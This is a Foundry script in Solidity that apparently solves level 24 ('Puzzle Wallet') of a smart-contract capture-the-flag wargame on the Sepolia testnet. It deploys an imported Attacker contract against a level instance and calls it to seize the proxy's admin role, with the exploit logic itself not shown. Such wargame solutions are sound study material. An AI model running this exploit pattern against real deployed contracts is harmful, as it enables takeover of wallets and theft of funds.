// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Script.sol";
import "src/24_Puzzle_Wallet/Level.sol";
import "src/24_Puzzle_Wallet/Attacker.sol";

contract PuzzleWalletScript is Script {
    //Prerequisites: Add SEPOLIA_PRIVATE_KEY and SEPOLIA_RPC_URL to your.env file
    
    //COMMANDS:
    //source .env
    //forge script script/24_Puzzle_Wallet.s.sol:PuzzleWalletScript --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("SEPOLIA_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        PuzzleProxy target = PuzzleProxy(payable(0x40268b76f4a9A008b5f3EEE110a02dFEA3De36d0)); //replace with your level instance
        uint valueToSend = address(target).balance;
        Attacker attacker = new Attacker{value:valueToSend}(address(target));
        attacker.attack(0xB6BAd06c81B424e5Ec582AC114C37A9D2650d35a); // replace with your player address
        
        address admin = target.admin();
        console.log(admin);
    }
}
